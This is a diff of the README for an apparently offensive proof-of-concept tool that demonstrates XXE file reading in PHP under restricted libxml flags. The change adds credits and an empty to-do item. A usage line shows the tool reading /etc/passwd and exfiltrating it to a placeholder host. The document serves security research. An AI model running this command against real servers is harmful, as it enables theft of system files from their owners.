@@ -1,4 +1,4 @@
-PoC tool to demonstrate XXE in PHP with only `LIBXML_DTDLOAD` or `LIBXML_DTDATTR` flag set
+PoC tool (based on [wrapwrap](https://github.com/ambionics/wrapwrap) & [lightyear](https://github.com/ambionics/lightyear) ) to demonstrate XXE in PHP with only `LIBXML_DTDLOAD` or `LIBXML_DTDATTR` flag set
 
 ## Usage
 
@@ -66,3 +66,4 @@ python3 wwe.py -f /etc/passwd --decode http://EXF_HOST_WITH_PORT MANUAL
 - enable/disable live mode
 - improved live view for other modes
 - full-auto DNS mode
+- 
